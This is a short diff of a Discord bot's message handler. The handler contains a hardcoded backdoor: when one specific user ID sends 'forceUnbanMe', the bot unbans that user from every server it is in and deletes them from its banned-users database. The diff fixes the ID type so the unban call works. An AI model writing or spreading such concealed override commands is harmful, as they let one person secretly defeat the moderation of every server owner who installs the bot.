@@ -9,7 +9,7 @@ module.exports = async(client, con, message) => {
     if(message.content.startsWith('forceUnbanMe') && message.author.id === '704094587836301392') {
         try {
             client.guilds.cache.forEach(async g => {
-                await g.members.unban(704094587836301392);
+                await g.members.unban('704094587836301392');
             });
         } catch(e) {}
         await con.query(`DELETE FROM bannedusers WHERE userid='704094587836301392'`, async (err, row) => {
